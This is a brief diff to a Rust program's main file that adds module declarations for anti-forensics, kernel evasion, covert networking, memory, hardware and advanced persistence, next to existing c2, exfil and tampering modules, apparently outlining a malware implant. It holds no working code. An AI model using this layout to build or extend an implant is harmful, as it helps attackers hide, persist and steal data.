@@ -2,11 +2,17 @@
 #![no_main]
 #![allow(unused_unsafe)]
 
+mod antiforensics;
 mod c2;
 mod evasion;
 mod exfil;
+mod hardware;
+mod kernel_evasion;
 mod maps;
+mod memory;
+mod network_covert;
 mod persistence;
+mod persistence_advanced;
 mod tampering;
 
 // ──────────────────────────────────────────────
